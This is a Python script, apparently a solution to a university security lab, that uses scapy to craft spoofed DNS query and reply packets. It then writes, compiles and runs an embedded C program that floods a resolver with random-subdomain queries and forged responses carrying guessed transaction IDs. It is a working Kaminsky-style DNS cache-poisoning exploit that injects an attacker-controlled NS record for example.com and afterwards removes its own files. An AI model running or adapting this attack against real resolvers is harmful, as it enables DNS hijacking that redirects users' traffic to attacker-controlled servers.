#!/usr/bin/env python

import os
import sys
import random
from scapy.all import *


targetName = "xxxxx.example.com"
targetDomain = "example.com"
attackerNS = "ns.hust-cse.net"

dstIP = "10.10.27.2"
srcIP = "199.43.133.53"  

# 构造DNS请求
ip  = IP(dst=dstIP,src="1.2.3.4")
udp = UDP(dport=53,sport=1234,chksum=0)
qds = DNSQR(qname=targetName)
dns = DNS(id=0xaaaa,qr=0,qdcount=1,ancount=0,nscount=0,arcount=0,qd=qds)
Querypkt= ip/udp/dns

with open('query.bin','wb')as f:
    f.write(bytes(Querypkt))


# 构造DNS响应
ip = IP(dst=dstIP,src=srcIP,chksum=0)
udp = UDP(dport=33333,sport=53,chksum=0)

Qdsec = DNSQR(qname=targetName)
Ansec = DNSRR(rrname=targetName,type='A',rdata='1.2.3.4',ttl=600)
NSsec = DNSRR(rrname=targetDomain,type='NS',rdata=attackerNS,ttl=600)
dns   = DNS(id=0xAAAA,aa=1,rd=1,qr=1,qdcount=1,ancount=1,nscount=1,arcount=0,qd=Qdsec,an=Ansec,ns=NSsec)
Replypkt = ip/udp/dns

with open('reply.bin','wb') as f:
    f.write(bytes(Replypkt))


attack_c = r"""
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>

#define MAX_FILE_SIZE 2000


/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char * buffer, int pkt_size);


int main()
{
  long i = 0;

  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("query.bin", "rb");
  if (!f_req) {
     perror("Can't open 'query.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("reply.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'reply.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26]="abcdefghijklmnopqrstuvwxyz";
  unsigned short transaction_id = 0;
  while (1) {
    // 构造长度为5的二级域名
    char name[6];
    for (int k=0; k<5; k++)  name[k] = a[rand() % 26];
    name[5] = '\0';
    printf("attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\n", 
         ++i, name, transaction_id);

    // 修改二级域名，发送dns请求
    memcpy(ip_req+41,name,5);               
    send_raw_packet(ip_req, n_req);

    // 回复给dns的包，其中有两处域名修改
    memcpy(ip_resp+41,name,5);               
    memcpy(ip_resp+64,name,5);

    for(int i=0;i<100;i++)
    {
        transaction_id++;

        // 修改序列号，重新发伪造包
        memcpy(ip_resp+28,&transaction_id,2); 
        send_raw_packet(ip_resp,n_resp);
    }
  }
  return 0;
}

void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
         &enable, sizeof(enable));

  struct ipheader *ip = (struct ipheader *) buffer;        
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
"""
with open('attack.c', 'wt') as f:
    f.write(attack_c)

os.system("gcc attack.c -o attack")
os.system("./attack")
os.system("rm query.bin reply.bin attack.c attack")
